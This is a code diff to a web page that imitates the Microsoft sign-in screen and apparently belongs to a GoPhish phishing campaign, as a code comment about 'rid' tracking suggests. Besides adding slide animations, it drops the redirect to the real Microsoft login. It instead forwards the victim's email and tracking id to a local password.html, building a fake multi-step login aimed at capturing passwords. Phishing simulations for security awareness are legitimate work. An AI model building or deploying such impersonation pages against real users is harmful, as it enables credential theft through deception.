@@ -157,6 +157,24 @@
       font-size: 14px;
       color: #0067b8;
     }
+
+    /* Slide transitions */
+    @keyframes slideInRight {
+      from { transform: translateX(30px); opacity: 0; }
+      to   { transform: translateX(0);    opacity: 1; }
+    }
+    @keyframes slideInLeft {
+      from { transform: translateX(-30px); opacity: 0; }
+      to   { transform: translateX(0);     opacity: 1; }
+    }
+    @keyframes slideOutLeft {
+      from { transform: translateX(0);    opacity: 1; }
+      to   { transform: translateX(-30px); opacity: 0; }
+    }
+    .slide-in-right { animation: slideInRight 0.35s cubic-bezier(0.36, 0.66, 0.04, 1) forwards; }
+    .slide-in-left  { animation: slideInLeft  0.35s cubic-bezier(0.36, 0.66, 0.04, 1) forwards; }
+    .slide-out-left { animation: slideOutLeft 0.3s  cubic-bezier(0.36, 0.66, 0.04, 1) forwards; }
+
   </style>
 </head>
 <body>
@@ -197,15 +215,23 @@
 
 <script>
   const params = new URLSearchParams(window.location.search);
-  const rid = params.get('rid'); // kept for GoPhish tracking
+  const rid = params.get('rid');
+  const dir = params.get('dir');
+  const box = document.getElementById('lightbox');
+
+  // Entry animation: slide in from left when returning, right otherwise
+  box.classList.add(dir === 'back' ? 'slide-in-left' : 'slide-in-right');
 
   function handleSubmit(e) {
     e.preventDefault();
     const email = document.getElementById('loginfmt').value.trim();
     if (!email) return;
 
-    // Redirect to real Microsoft with email pre-filled
-    window.location.href = 'https://login.microsoftonline.com/?username=' + encodeURIComponent(email);
+    const next = 'password.html?email=' + encodeURIComponent(email) + (rid ? '&rid=' + encodeURIComponent(rid) : '');
+
+    // Slide out to the left, then navigate
+    box.classList.add('slide-out-left');
+    setTimeout(() => { window.location.href = next; }, 300);
   }
 </script>
 
